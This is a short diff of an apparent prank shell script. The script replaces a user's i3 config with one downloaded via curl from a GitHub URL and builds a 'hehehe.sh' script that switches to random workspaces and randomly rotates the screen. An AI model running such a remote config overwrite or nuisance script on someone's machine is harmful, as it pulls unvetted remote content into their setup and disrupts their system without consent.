@@ -4,6 +4,7 @@ mv ~/.config/i3/config ~/.config/i3/oldconfig
 curl https://raw.githubusercontent.com/Ellmos/cf/main/config > ~/.config/i3/config
 
 echo '#!/bin/sh' >> ~/.config/i3/hehehe.sh
+echo '' >> ~/.config/i3/hehehe.sh
 echo 'i3-msg "workspace" $(( $RANDOM % 10))' >> ~/.config/i3/hehehe.sh
 echo 'ouaip=("left" "right" "normal" "inverted")' >> ~/.config/i3/hehehe.sh
 echo 'xrandr -o ${ouaip[$(( $RANDOM % 4))]}' >> ~/.config/i3/hehehe.sh
